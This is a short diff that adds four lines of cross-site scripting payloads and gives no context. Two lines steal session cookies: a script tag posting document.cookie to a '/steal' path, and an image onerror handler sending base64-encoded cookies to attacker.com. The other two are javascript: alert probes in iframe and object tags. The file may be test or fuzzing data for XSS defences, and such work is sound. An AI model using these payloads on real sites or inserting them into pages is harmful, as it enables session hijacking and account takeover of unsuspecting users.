@@ -1,0 +1,4 @@
+<script>fetch('/steal?cookie='+document.cookie)</script>
+<img src=x onerror="fetch('http://attacker.com/?c='+btoa(document.cookie))">
+<iframe src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
